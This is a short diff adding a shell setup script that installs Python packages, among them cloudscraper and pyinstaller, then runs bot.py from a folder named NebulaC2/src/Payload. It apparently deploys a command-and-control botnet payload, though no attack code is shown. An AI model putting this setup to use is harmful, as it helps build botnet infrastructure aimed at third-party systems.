@@ -1,0 +1,13 @@
+sudo apt update
+sudo apt install python3-pip -y
+sudo pip install cloudscraper
+sudo pip install requests
+sudo pip install ipaddress
+sudo pip install colorama
+sudo pip install pyinstaller
+sudo pip install autopytoexe
+sudo apt install daemon
+
+cd /home/ubuntu/NebulaC2/src/Payload
+
+sudo screen python3 bot.py
